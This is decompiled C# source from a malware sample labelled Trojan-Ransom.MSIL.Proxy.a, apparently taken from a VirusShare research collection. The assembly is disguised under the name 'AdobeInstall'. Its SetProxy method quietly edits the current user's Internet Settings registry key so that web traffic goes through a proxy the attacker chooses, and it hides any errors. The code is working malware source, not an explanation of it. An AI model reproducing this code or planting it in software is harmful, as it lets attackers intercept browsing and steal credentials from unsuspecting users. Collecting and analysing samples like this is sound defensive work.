// Decompiled with JetBrains decompiler
// Type: AdobeInstall.SettingsHelper
// Assembly: AdobeInstall, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DFDDE196-DEB9-44F6-B5C0-C51F3E45F14A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00023-msil\Trojan-Ransom.MSIL.Proxy.a-74e82ea2869b3858b3c14d5a38f1a8d06d6eda8469762f33236a05ee0f65fa07.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Globalization;

namespace AdobeInstall
{
  public class SettingsHelper
  {
    public static void SetProxy(string ip, int port)
    {
      RegistryKey registryKey1 = (RegistryKey) null;
      RegistryKey registryKey2 = (RegistryKey) null;
      try
      {
        registryKey1 = Registry.CurrentUser;
        registryKey2 = registryKey1.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
        if (registryKey2 == null)
          return;
        registryKey2.SetValue("ProxyServer", (object) ("http=" + ip + ":" + port.ToString((IFormatProvider) CultureInfo.InvariantCulture)));
        registryKey2.SetValue("ProxyEnable", (object) 1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      finally
      {
        if (registryKey1 != null)
        {
          registryKey1.Flush();
          registryKey1.Close();
        }
        if (registryKey2 != null)
        {
          registryKey2.Flush();
          registryKey2.Close();
        }
      }
    }
  }
}
